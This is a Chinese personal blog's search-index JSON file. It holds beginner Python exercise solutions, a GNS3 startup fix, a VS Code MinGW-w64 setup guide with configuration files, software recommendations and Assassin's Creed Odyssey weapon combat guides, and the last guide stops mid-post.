{"pages":[{"title":"","text":"hbumdp9xMJ","link":"/baidu_verify_hbumdp9xMJ.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"关于本站","text":"本站使用hexo搭建站点的主题是icarus评论系统使用valine托管于阿里云","link":"/about/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"GNS3启动时遇到的问题","text":"GNS3在启动的时候可能出现目标主机积极拒绝的情况这时候用管理员方式打开power shell输入如下命令再重启就可以解决 netsh winsock reset","link":"/2019/11/26/GNS3启动时遇到的问题/"},{"title":"python练习--三角函数计算","text":"三角函数计算 描述根据下面公式计算并输出x的值，a和b的值由用户输入，括号里的数字是角度值， 圆周率的值使用数学常数math.pi。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬ 输入示例:输入包括两行, 每行一个数字。 1225 输出示例:一个数值-0.9209814967618768 示例代码 12345import matha = eval(input())b = eval(input())x = (-b+math.sqrt(2*a*math.sin(math.pi/3)*math.cos(math.pi/3)))/(2*a)print(x)","link":"/2019/11/26/python练习-三角函数计算/"},{"title":"python练习--字符串长度","text":"字符串长度 描述用户输入一个字符串，程序输出字符串的长度 输入示例:输入一个字符串。 1Hello world! 输出示例:一个表示字符串长度的整数 112 示例代码 12a = input()print(len(a))","link":"/2019/11/27/python练习-字符串长度/"},{"title":"python练习--子字符串输出","text":"子字符串输出 描述按要求完善示例程序： 123456#分两行输出 python语言程序设计#python字符串可采用区间形式访问，采用[M:N]格式表示字符串中从M到N-1的子字符串name = &apos;python语言程序设计&apos;print(name[ ]) #在[]中填上合适的数字，使此语句输出pythonprint(name[ ]) #在[]中填上合适的数字，使此语句输出语言程序设计 输入示例:该题目没有输入。 1225 输出示例: 12python语言程序设计 示例代码 123name = &apos;python语言程序设计&apos;print(name[:6])print(name[6:])","link":"/2019/11/27/python练习-子字符串输出/"},{"title":"python练习--格式化输出","text":"格式化输出 描述用户输入一个小数，用format格式化输出，保留3位小数。 输入示例:输入一个数。 13.14159 输出示例:保留小数点后3位的数 13.142 示例代码 12a = input()print(\"{0:.3f}\".format(eval(a)))","link":"/2019/11/27/python练习-格式化输出/"},{"title":"python练习--分类统计字符","text":"分类统计字符 描述用户输入一个字符串，分别统计其中小写字母、大写字母、数字、空格和其他字符的个数，并在一行内输出小写字母、大写字母、数字、空格和其他字符的个数。 输入示例:输入一个字符串。 1Aa787ghWRD u !#$ 输出示例:在一行内输出小写字母、大写字母、数字、空格和其他字符的个数 14 4 3 2 3 示例代码 123456789101112131415a = input()x1 = x2 = x3 = x4 = x5 =0for i in range(len(a)): if 'a' &lt;= a[i] &lt;= 'z': x1 += 1 elif 'A' &lt;= a[i] &lt;= 'Z': x2 += 1 elif a[i].isnumeric(): x3 += 1 elif a[i] == ' ': x4 += 1 else: x5 += 1print(x1, x2, x3, x4, end=' ')print(x5)","link":"/2019/11/27/python练习-分类统计字符/"},{"title":"python练习--字符串逆序输出","text":"字符串逆序输出 描述用户输入一个字符串，倒序输出。 ‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬ 输入示例:输入一个字符串。 1hello 输出示例:一个倒序的字符串 1olleh 示例代码 12a = input()print(a[::-1])","link":"/2019/11/27/python练习-字符串逆序输出/"},{"title":"python练习--棋盘放米","text":"棋盘放米 描述相传古代印度国王舍罕要褒赏他的聪明能干的宰相达依尔 （国际象棋发明者），问他需要什么，达依尔回答说：“国王只要在国际象棋的棋盘第一个格子里放一粒麦子，第二个格子里放两粒，第三个格子里放四粒，按此比例以后每一格加一倍，一直放到64格（国际象棋棋盘是8×8=64格），我就感恩不尽，其他的我什么也不要了，”国王想：“这有多少，还不容易！”让人扛来一袋小麦，但不到一会儿全用没了，再来一袋很快又没有了，结果全印度的粮食全部用完还不够，国王纳闷，怎样也算不清这笔账，请你帮国王计算一下，共需多少粒麦子，写出程序。 输入示例:该题目没有输入。 输出示例:一个数值 示例代码 12x = sum(2**i for i in range(64))print(x)","link":"/2019/11/27/python练习-棋盘放米/"},{"title":"python练习--数列求和","text":"数列求和 描述给定某数字a（1≤a≤9）以及非负整数n（0≤n≤100000），求数列之和sum=a+aa+aaa+⋯+aa⋯a（n个a）。例如a=2, n=3时，sum=2+22+222=246。 输入输入有两行：‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬第一行输入数字a‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬第二行输入非负整数n 12342310 输出示例:输出其N项数列之和S的值。 123246‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬0 示例代码 12345678a = eval(input())n = eval(input())x = as = 0for i in range(n): s = s+x x = x*10+aprint(s)","link":"/2019/11/27/python练习-数列求和/"},{"title":"vs code使用mingw-w64编译运行c","text":"在VS Code中使用Mingw-w641.安装Visual Studio代码。2.为VS Code安装C ++扩展。3.Mingw-w64安装到其路径中没有空格的文件夹（换句话说，不是C:/Program Files/的默认位置）。在本教程中，我们假定将其安装在下C:\\Mingw-w64。 4.将您的Mingw-w64 bin文件夹的路径添加到Windows PATH环境变量。转到Windows操作系统设置，然后为您的帐户搜索“编辑”环境变量。选择Path变量，然后选择“ 编辑”。选择“ 新建”，然后将Mingw-w64路径添加到系统路径。确切的路径取决于您安装的Mingw-w64版本和安装位置。这是一个示例：c:\\mingw-w64\\x86_64-8.1.0-win32-seh-rt_v6-rev0\\mingw64\\bin。选择确定以保存Path更新。您将需要重新打开所有控制台窗口，以使新的PATH位置可用。 配置编译器路径1.按Ctrl + Shift + P打开命令面板 2.输入c/c++,选择Edit Configurations (UI) 3.找到编译器路径设置。VS Code会根据在系统上找到的内容尝试使用默认编译器填充它。它首先查找MSVC编译器，然后在Windows Subsystem for Linux（WSL）上查找g ++，然后在Mingw-w64上查找g ++。如果安装了Visual Studio或WSL，则需要在此处更改编译器路径。如果使用Win32线程和SEH异常处理在C：\\ mingw-w64下安装Mingw-w64版本8.1.0，则路径应如下所示：C:\\mingw-w64\\x86_64-8.1.0-win32-seh-rt_v6-rev0\\mingw64\\bin\\g++.exe。如果在安装Mingw-w64时选择了其他选项，则您的路径将不同。该编译器的路径设置是配置中的最重要的设置。该扩展使用它来推断C ++标准库头文件的路径。当扩展知道在哪里可以找到那些文件时，它可以在您编写代码时为您提供许多有用的信息。此信息称为IntelliSense，您将在本教程的后面看到一些示例。4.将IntelliSense模式设置为gcc-x64。创建构建任务1.创建一个Tasks.json文件2.用下面的代码替换 1234567891011121314 &quot;version&quot;: &quot;2.0.0&quot;, &quot;tasks&quot;: [ { &quot;label&quot;: &quot;build hello world&quot;, &quot;type&quot;: &quot;shell&quot;, &quot;command&quot;: &quot;g++&quot;, &quot;args&quot;: [&quot;-g&quot;, &quot;-o&quot;, &quot;helloworld&quot;, &quot;helloworld.cpp&quot;], &quot;group&quot;: { &quot;kind&quot;: &quot;build&quot;, &quot;isDefault&quot;: true } } ]} 该command设置指定要运行的程序；在这种情况下，它就是g ++。exe。该args数组指定将传递给g ++的命令行参数。必须按照编译器期望的顺序指定这些参数。该label值就是您将在VS Code命令面板中看到的值；您可以随意命名。对象中的isDefault”: true值group指定当您按Ctrl + Shift + B时将运行此任务。此属性仅出于方便起见；如果将其设置为false，则必须从“ 运行构建任务”下的“命令面板”菜单中运行它。配置调试设置1.在命令面板中，键入“ launch”，然后选择Debug: Open launch.json。接下来，选择GDB / LLDB环境。2.对于program，请使用程序名称helloworld.exe（与您在tasks.json中指定的名称匹配）。您将需要调整您的miDebuggerPath值以匹配Mingw-w64安装的路径。3.默认情况下，在C ++扩展名的第一行添加了一个断点main。该stopAtEntry值设置为true使调试器在该断点处停止。如果您希望忽略它，可以将其设置为false。完整的launch.json内容应如下: 123456789101112131415161718192021222324252627 // Use IntelliSense to learn about possible attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ { &quot;name&quot;: &quot;(gdb) Launch&quot;, &quot;type&quot;: &quot;cppdbg&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;${workspaceFolder}/helloworld.exe&quot;, &quot;args&quot;: [], &quot;stopAtEntry&quot;: true, &quot;cwd&quot;: &quot;${workspaceFolder}&quot;, &quot;environment&quot;: [], &quot;externalConsole&quot;: true, &quot;MIMode&quot;: &quot;gdb&quot;, &quot;miDebuggerPath&quot;: &quot;C:\\\\mingw-w64\\\\x86_64-8.1.0-win32-seh-rt_v6-rev0\\\\mingw64\\\\bin\\\\gdb.exe&quot;, &quot;setupCommands&quot;: [ { &quot;description&quot;: &quot;Enable pretty-printing for gdb&quot;, &quot;text&quot;: &quot;-enable-pretty-printing&quot;, &quot;ignoreFailures&quot;: true } ] } ]} 最后运行代码即可","link":"/2019/11/25/vs-code使用mingw-w64编译运行c/"},{"title":"分享一些比较好用的软件","text":"一：树洞ocr文字识别工具一款识别率很高的ocr工具；支持多屏模式；支持百度识别接口；支持识别打开的图片； xxx-with-jre.xx 是完整版，带运行环境；如果精简版不能正常工作，请下载完整版使用；文字识别使用了各云平台开发的识别接口，因此需要联网才能正常使用；本程序使用 JavaFX 开发，使用前请务必安装 Java8 运行环境（完整版无需安装 Java8）。在复制百度文库等有复制限制的文献资料内容时可以直接截图识别复制树洞OCR下载地址 二：EverythingWindows自带的文件搜索十分的缓慢，这款软件就很好的解决了这个问题，而且软件本身十分小。everything下载地址 三：cc助手遇到任何想要收藏保存的语句，文件，网址，聊天内容等碎片化信息，都可一直接选中并按两次CTRL+c就能保存cc助手下载地址","link":"/2019/08/01/分享一些比较好用的软件/"},{"title":"刺客信条奥德赛战斗技巧综述","text":"1. 键鼠默认操作是左键轻击，shift+左键重击，长按shift+左键蓄力重击，有侧键的鼠标推荐把重击改成侧键或者右键，这样按起来会简单很多而且基本不会失误，在标题界面进入控制选项可以更改。如果重击改成右键，那么蓄力重击只需要长按右键即可。 2. 骑马是把所有轻攻击变成重攻击，长按轻攻击则变成蓄力重击。锤子的重击倍率最高，所以骑马作战推荐用锤子。 3. 所有近战武器原地连续攻击数次之后都会施展终结技，通常是动作较慢但威力巨大的一招。轻击则为轻击终结技，重击则为重击终结技。通常重击终结技的威力巨大，但命中难度较高。学习了战士技能3级武器大师之后，终结重击则会造成两倍的伤害。在后文中，施展一套完整的连击输出指令的次数称为连击次数，第几次攻击使用轻击则称为几轻，重击同理。例如3轻指第三下连击使用轻击，2重指第二下连击使用重击。 4. 格挡（键鼠默认Q）成功之后重击会直接使出终结重击（匕首除外，因为没有），但是没有技能的双倍加成。单挑的情况下格挡成功之后使用格挡重击，除非敌人立即进入霸体取消硬直，否则时间总是足够你的重击打中。但是要注意当敌人为长矛等长兵器时，在远距离格挡后继续弹出一定距离，会导致部分武器的格挡重击无法命中目标。当被众多敌人包围时则要看情况使用，否则很容易在施放重击时遭到其他敌人的攻击。具体武器的处理方式会在后续详细说明。 5. 闪避之后的轻击和重击攻击动作都会改变，俗称闪轻或者闪重，在连击的过程中视为第一次连击。不同武器的闪避攻击实用性和技巧有所不同，会在后续详细说明。 6. 重击并不总是比轻击慢，适当的轻重组合能打出比纯轻击组合更快的速度。但是速度最快也未必最好，有时候重击能打出更多的硬直时间让后续攻击更容易打中，具体武器如何连招会在后续详细说明。 7. 很多人会觉得蓄力重击是垃圾招式，实际上并不是。当然如果你喜欢混沌环无脑秒群体、时间减缓无脑打单体，那么蓄力重击对于你来说确实不需要。本文讨论的是尽量不使用混沌环、公牛猛击、时间减缓、狂袭下的战斗技巧。 蓄力重击在3级之前实战意义较小，如果要用务必点到3级。蓄力重击一旦释放，则后续进入全程霸体状态，不会被敌人的攻击击退和打出硬直，但是会受到伤害。我们可以利用这一点和敌人拼霸体，将血量低于一定程度的敌人直接斩杀而自己不会受到伤害，即使斩杀失败自己也不会进入硬直可以应付接下来的情况。具体武器的蓄力重击的特点和使用技巧会在后续详细说明。 8. 狂袭：除了长矛和手杖，对于进入狂袭动画的敌人，其他四种武器的狂袭是无法暴击的，只有对于倒地状态的敌人，或者无锁状态下突然反身攻击，或者是动物、神兽等非人类敌人使用狂袭时，全部类型的武器狂袭都能打出暴击。由于本文着重于介绍武器的使用技巧，对于狂袭只是简单的介绍一下不同武器的特性。 9. 按格挡键（键鼠默认Q）可以取消当前攻击的硬直并且立即重置连击次数，即连击会变成第一击的攻击动画。这一技巧对于大锤比较实用，连续重击的硬直非常巨大，一次完美闪避不一定能打出连续的两次重击，但是可以格挡取消第一次攻击后摇的方式来快速的打出第二击，但是由于重置连击次数是无法施展出终结重击的，如果要用终结重击请开时间减缓。对于其他武器的使用方式，通常是将敌人卡在墙角而我方将敌人击飞时，可以直接用格挡取消终极重击等招式的后摇立刻进入下一轮连击，比闪避取消后摇速度更快而且不用改变位置。 10. 格挡可以挡掉飞行的箭矢。如果是视线内的弓手并且距离自己的距离较远，可以尝试用格挡来反制弓箭，避免反复闪避影响自己的攻击节奏和走位。当然，大部分时候弓手还是优先解决掉比较好。","link":"/2019/04/02/刺客信条奥德赛战斗技巧综述/"},{"title":"刺客信条奥德赛武器技巧之手杖","text":"综述：手杖可以说是基础连招最强的武器类型，上手非常容易，熟练后可以轻松应对所有情况，唯一的缺点就是缺少一点爆发伤害。轻重击速度快，普通轻击的招式重就包含突进和AOE，可以根据实际情况灵活组合。不过手杖的人气不算高，主要还是因为不够帅的原因吧。 1． 连击：手杖的连击次数是5，轻击倍率是1和刀剑一样，重击倍率是1.18只比轻击略高，但大部分重击速度都很快，可以打出各种轻重击组合连击。普通轻击前4下都有面前的一个AOE效果，只有终结轻击是单体攻击；普通重击则相反，前4下都是单体，终结重击则是一个大范围的攻击。另外，手杖是唯一一个终结轻击倍率比终结重击高的武器，终结轻击是2而终结重击是1.8，而且4轻之后接终结轻的速度非常快，单挑的时候应该打4轻5轻。注意4重的动作在手杖中偏慢，实战中没有破盾的需求应多用4轻，其他位置的轻重则速度差异不大。 常用连击：轻轻轻轻重，轻重重轻轻，轻重重轻重，轻轻重轻重。4轻起手的组合是用来应对大量低级士兵，可以打出可观的AOE伤害；轻重重轻轻和轻重重轻重的组合则是快速兼具伤害，可以作为最常用的连击组合。如需要破盾则改为重击起手。 2． 闪避攻击：手杖的闪避轻击和重击都继承了普通轻重击的特点，闪避轻击是一个范围较大的挥砍，闪避重击是一个单体的上撩动作，两者的起手速度都非常快，可以用于闪避后的快速起手攻击。其中，闪避重击的速度比普通重击起手要稍快一些，破盾的时候可以更多的考虑闪避重击起手。闪避轻击和普通轻击起手相比，攻击的距离更远但是从按下闪避指令开始算的出手速度则要慢一些，如果要快速击杀拉弓蓄力中的弓箭手用普通轻击起手即可，如果用闪避轻击起手则可以向左侧闪避然后用右侧的攻击判定来打，这样更难被弓箭手打到。 3． 格挡反击：在应对大量敌人时，格挡成功后可以无脑用格挡重击，产生大范围的一个AOE伤害，只是伤害倍率略低只有1.8。不过手杖的追击能力很强，在击退或者击飞之后可以立即追击。单挑时则要视具体情况而定，霸体类佣兵应当用格挡重击打出硬直（即使是坚忍不懈也并非绝对霸体，具体可以看视频）之后再追击，非霸体类敌人则应当用快速的轻重组合追击。 4． 蓄力重击：手杖的蓄力重击是一个不错的招式，不过手杖的普通连击就足够实用，所以蓄力重击的使用频率也不是很高。动作为跳跃起来同时上挑，然后是一个顺势斜劈，第一下起手非常快，紧跟着的第二个动作也不慢，和斧子同样是两个动作但实用性比斧子要强。倍率较低只有0.75+1.5而且有两段伤害，因此不适合像刀剑和大锤一样打瞬间反击，但是可以利用快速的出手来打主动进攻。一个常用的打法是利用第一击挑开敌人盾牌然后第二击击退或者击飞，在破盾方面非常好用。 5． 狂袭：手杖的狂袭可以说是常规情况下最好用的狂袭。虽然倍率较低只有三段2.18和二段2，加起来只有10.54，但是可以对任意敌人暴击，并且起手是大范围的快速三次扫击，然后追加一次扫击和一次跳跃下砸，比起长矛来说容易控制很多且攻击范围大的多，是狂袭流的第一选择。关于狂袭本文就不多介绍。","link":"/2019/04/02/刺客信条奥德赛手杖/"},{"title":"python练习--鸡兔同笼","text":"鸡兔同笼 描述大约在1500年前，《孙子算经》中就记载了这个有趣的问题。书中是这样叙述的：今有雉兔同笼，上有三十五头，下有九十四足，问雉兔各几何？这四句话的意思是：有若干只鸡兔同在一个笼子里，从上面数，有35个头，从下面数，有94只脚。问笼中各有多少只鸡和兔？‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬ 请编一个程序，用户在同一行内输入两个整数，代表头和脚的数量，编程计算笼中各有多少只鸡和兔，假设鸡和兔都正常，无残疾。如无解则输出Data Error! 123a,b = input().split() #读入两个数到a b中a,b = map(int,input().split(&apos;,&apos;)) #读入两个整数到a，b中，输入的数用逗号分隔a,b = map(int,input().split(&apos; &apos;)) #读入两个整数到a，b中，输入的数用空格分隔 输入示例:在一行里输入两个整数,用空格分隔 。 12335 94‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬-4 16 输出示例:在一行里输出两个正整数，分别是鸡和兔的数量，用空格分隔‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬如无解则输出Data Error! 12323 12‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬Data Error! 示例代码 123456789a, b = map(int,input().split(&apos; &apos;))x = b-(2*a)x = int(x/2)y = int(a-x)if x &gt;= 0 and y &gt;= 0: print(y, end=&quot; &quot;) print(x)else: print(&quot;Data Error!&quot;)","link":"/2019/11/27/python练习-鸡兔同笼/"},{"title":"刺客信条奥德赛武器技巧之斧","text":"综述：斧子是一个上手非常简单、后期也非常强力的武器，跟匕首并列是新人的最佳开荒武器。即便无脑轻击也非常强力，伤害高而且破盾能力强，攻速也不算慢，却有着最强的轻击倍率。重击每一击都是大范围的AOE，范围攻击能力非常强，特别是格挡重击能够有效的应对群战。缺点是缺少一个快速的起手攻击招式，遇到AI比较高的远程敌人会比较难以处理。 1. 连击：斧子的连击次数是4，轻击重击的倍率都是1.9，为全武器最高；同时轻重终结技的倍率都是2.85，也就是说斧子在打伤害方面轻重击没有差异；区别是重击稍微慢一些，但是速度差异也不是很明显，而轻击基本都是攻击面前的敌人，重击都为范围攻击。由于轻重击速度差异并不明显，所以大多数时候斧子都是重击为主。 常用连击：轻重重重，轻重轻重，轻轻重重。最快的连击方式是轻重轻重，不过上述几种连击方式的速度差异并不明显，实际用起来差别不大。第一下轻击比重击快一些，如果要破盾用轻击起手即可，因为重武器轻击也自带破盾效果。终结技轻击感觉反而比重击慢一些，而且同样会造成击飞或者击退的大硬直，而重击是一个范围巨大的横扫，所以通常以重击收尾。 2. 闪避攻击：斧子的闪避攻击起手速度也比较慢，跟普通轻击的速度差不多；但是加上闪避的时间则要更长，所以如果应对拉弓蓄力的远程敌人，直接轻击起手即可，闪避攻击起手很容易被射中。闪避轻重击出手速度感觉差不多快，闪避重击的范围也不是很大，所以闪避攻击用轻重击感觉没多少差别。 3. 格挡反击：格挡反击是斧子的灵魂招式。格挡成功后重击直接使出终结重击，超大范围的横扫而且动作很快，在实战中可以频繁的利用格挡重击来杀伤大量敌人。同时，格挡重击也有击飞击退效果，如果是霸体敌人则可以用格挡迅速取消重击后摇追加1-2次攻击。 4. 蓄力重击：斧子的蓄力重击倍率是1.35+1.8仅次于大锤，比剑的蓄力重击稍高，但是分为两次攻击，第二次攻击动作太慢，很容易在这个过程中受到伤害，因此实用性不强。动作是抡起斧子转两圈，第一下判定非常快，第二下判定就慢很多，每转一圈人会往前走一步，攻击距离还算比较远，范围自然是很大，不过斧子并不缺少AOE能力，而缺少快速突进起手的能力，所以总的来说这招不实用。 5. 狂袭：斧子的狂袭和大锤一样，是单体两段6.9倍率的攻击，在有多个敌人时可以连续施放4次，对进入动画的敌人无法暴击。关于狂袭本文就不多介绍。","link":"/2019/04/02/刺客信条奥德赛武器技巧之斧/"},{"title":"刺客信条奥德赛武器技巧之刀剑","text":"综述：刀剑是一个上手觉得简单，用一段时间后觉得比较弱，但实际上非常强的一个武器类型。觉得刀剑弱通常是只会无脑轻击连击，或者重击连击，实际上刀剑的核心在于两招，一是闪避轻击，二是蓄力重击。如果只会用轻重击连击的话，会严重依赖时间减缓这个技能。因为刀剑的连击速度只能说尚可，加上普通连击的攻击距离特别短，很容易被霸体反打。 1． 连击：刀剑的连击次数是5，轻击倍率是1，重击倍率是1.5，轻重击的速度差异不是很大，可以根据具体情况来选择轻重组合。需要注意的是刀剑第二击在绝大多数情况下都选择重击，因为2重的速度比2轻还快一点，动作上是一个非常干净利落的下劈，在轻击命中之后通常都能追加一刀。终结轻击的倍率是2，终结重击的倍率是3*2，但是终结重击的前摇特别大，在应对佣兵类敌人和群战时应当谨慎使用。终结轻的倍率虽然低一些，但是比长矛的1.25还是高很多，相当于两次轻击了，可以作为多数时候的选择。 常用的连击方式：轻重轻轻轻，轻重轻重轻。刀剑的第一击如果重击的话速度非常慢，在大多数情况下都不推荐作为起手招式，第一击如果要破盾用闪避重击起手，第二击务必用重击，后面三击可以视情况具体组合，不过在不用时间减缓的情况下刀剑是不怎么打满连击的，实战中比较危险。 2． 闪避攻击：刀剑的闪避轻击是刀剑的核心招式之一。动作为突进前刺，起手速度非常快，同时攻击距离在刀剑的所有招式中最远，甚至可以接近长矛普通轻击的距离。所以使用方式上和长矛的闪避轻击很像，用来快速接近弓箭手等敌人非常好用。闪避重击有一个小踏步但是攻击距离非常短，只适合用于完美闪避之后追击，或者主动破盾使用。 3． 格挡反击：刀剑的终结重击威力也比较大，有普通轻击的3倍（点出技能则是6倍，格挡重击不触发）。和长矛类似，终结重击的前摇特别大，容易在施展的时候被打，群战中要看情况谨慎使用。另外，刀剑的终结重击距离特别短，在较远距离格挡时很容易打空，这时候应该选择闪避轻击+重击的方式来追击。 4． 蓄力重击：蓄力重击是刀剑的核心招式之一。动作为快速的一个上挑，起手速度非常快，攻击距离较远，而且倍率为3，在6种武器种排第三，仅次于两种重型武器。点出2级蓄力重击之后倍率要乘以1.5，即变成4.5，相当于4.5次轻击。点出3级技能之后蓄力时间减少25%，如果要用蓄力重击务必点满。由于刀剑的蓄力重击起手非常快，在成功格挡之后可以用蓄力重击来反击，伤害比格挡重击还要高不少。同样，在群战被围的时候要谨慎使用。 由于蓄力重击是一个全程霸体招式，而刀剑的蓄力重击有单次高伤害、起手快的特点，非常适合用于拼霸体。只要敌人进入斩杀线，那么可以顶着敌人的攻击直接用蓄力重击，只要我方先攻击到对方即可无伤斩杀。即使斩杀失败依然能攻击到对方，而且我方处于霸体不会被打出硬直，有利于后续的调整。 5． 狂袭：刀剑的狂袭是10段1.6倍率的攻击，但是对于进入动画的敌人无法暴击，因此实用性较低。对倒地状态的敌人或者动物、神话生物可以直接打出全部倍率的一击并且能暴击，伤害足够高的情况下可以实现秒杀的效果。关于狂袭本文就不多介绍。","link":"/2019/04/02/刺客信条奥德赛武器技巧之刀剑/"},{"title":"刺客信条奥德赛武器技巧之长矛","text":"综述：长矛是一个上手简单、单挑非常强势群战也不弱的武器。优点是距离长、轻击出手快，缺点是大部分重击出手慢，破盾能力较弱，遇到一大群带盾敌人时不适合主动出手（用混沌环就不说了，后续的武器也是，不再重复解释）。AOE能力方面中上，站成一条直线的敌人可以全部攻击到，由于奥德赛中敌人的AI并不会一窝蜂的围上来，所以在拉火车的时候可以很容易的达成2-3人站成一条直线的情况。 1. 连击：长矛的连击次数是4，轻击倍率是1.05，重击倍率是1.65，重击倍率比轻击倍率高很多，但是大部分的重击速度较慢，因此长矛仍然是以轻击为主要攻击手段。1重除非用于破盾否则通常不使用，2重在绝大多数时候都不考虑使用，3重则在大多数时候使用，终结技使用轻击还是重击则要视具体情况决定。终结轻的倍率只有1.25，而终结重击的倍率有3.3*2（学习3级武器大师的情况下才会*2），所以能保证命中的前提下（例如开时间减缓，不过这不在本文的讨论范畴）一定是使用终结重击。终结重击会将敌人击飞，如果在墙角可以用格挡取消后摇，如果在平地上则可以向前闪避或者翻滚来取消后摇并追击。 常用的连击方式：轻轻轻轻，轻轻重轻，轻轻重重。如果需要起手破盾则用重击起手。第三次攻击使用重击还是轻击，一是取决于对敌人硬直的判断，如果是攻击频繁霸体的佣兵第三击可以考虑用轻击，其他大部分时候用重击；二是取决于终结技是否使用，如果要打终结技，那么第三击基本是要用重击，否则终结技打空的概率会大大增加。 2. 闪避攻击：长矛的闪避轻击是最好用的闪避招式之一。起手速度快，带突进并且攻击距离极远，无论是用来主动起手进攻还是闪避后反击都是好用的招式。在应对野猪、山猫、神箭手、领袖等频繁后退的敌人时，应当主动用闪轻突进并攻击，其中神箭手、领袖、部分弓手类佣兵在被接近后大概率会使用霸体推，虽然伤害不高但是前摇很小，而且会把玩家击退并且打出一个较大的硬直，长矛在应对这类敌人时有两个处理方法，一是保持一定距离攻击那么敌人就不会出这招，二是主动贴身攻击后不要急着连击，看准敌人身体变红的一瞬间按下闪避大概率可以触发完美闪避，可以立即打出重击+轻击的反击。 闪避重击的动作比较独特，是长矛仅有的两个横扫类招式之一，但是出手较慢距离也不长，在被多人围攻时很容易在攻击动作中被打。触发完美闪避时，可以用闪重打出第一击再追加一次轻击，比单纯的两次轻击伤害高。 3. 格挡反击：长矛的终结重击威力巨大，在单挑时格挡成功后应当使出格挡重击。虽然会把敌人击退或者击飞，但是长矛的闪避轻击可以很方便的追击敌人，被击飞的敌人在敌人起身之前仍然可以攻击1-2次，佣兵通常只能击退，可以追击一次闪避轻击。当被敌人包围时，格挡成功后则要慎重的使用终结重击，比较稳妥的选择时利用格挡时的时间减缓观察一下附近的敌人，闪避到安全的位置之后用闪避轻击起手连击，通常可以打出1-2次的反击。 4. 蓄力重击：长矛的蓄力重击不算好用，出伤害之前要先伦一圈，因此伤害判定较慢，而且攻击距离在长矛的动作中也不算很远，倍率2.25也很低，在6种武器种排倒数第二，和手杖并列，仅比匕首的2高一点。所以通常来说长矛的蓄力重击是不用的。 5. 狂袭：长矛的狂袭是6次2.18倍率的攻击加一次2倍率的攻击，然后是一次2倍率的跳跃下砸，一共是8次攻击，总倍率在全武器中第一。在攻击中可以通过移动和视角控制攻击方向，但是要全中还是比较困难。由于对站立人类敌人也能暴击，所以长矛的狂袭可以在常规作战中使用，也可以搭配狂袭-1的铭刻专门玩狂袭流，本文就不多介绍。","link":"/2019/04/02/刺客信条奥德赛武器技巧之长矛/"},{"title":"刺客信条奥德赛武器技巧之匕首","text":"综述：匕首是上手最简单的武器，熟练之后也不弱。优点是速度在全武器中最快，并且重击带突进，有效的规避了自身手段的缺点。那么剩下的一个缺点就是伤害比较低，轻击倍率只有0.45，虽然攻速很快，但是连续轻击的dps并不算高。同时，缺乏重击终结技使得格挡之后很难打出高伤害，蓄力重击的倍率也是全武器最低的2。总的来说是比较适合单挑的武器，但对付频繁霸体的佣兵也需要一定的技巧。 1. 